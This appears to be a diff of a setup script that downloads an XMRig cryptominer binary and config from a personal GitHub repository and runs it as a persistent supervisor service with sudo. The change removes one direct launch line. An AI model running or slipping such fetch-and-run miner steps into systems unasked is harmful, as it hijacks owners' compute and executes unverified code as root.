@@ -5,7 +5,6 @@ sudo apt install -y hwloc wget supervisor
 wget https://raw.githubusercontent.com//henglxm/xmr/main/xmrig
 chmod +x xmrig
 wget https://raw.githubusercontent.com//henglxm/xmr/main/config.json
-sudo ./xmrig &
 wget https://raw.githubusercontent.com/henglxm/xmr/main/xmr.conf -O /etc/supervisor/conf.d/xmr.conf
 sudo systemctl enable supervisor.service
 sudo systemctl start supervisor.service
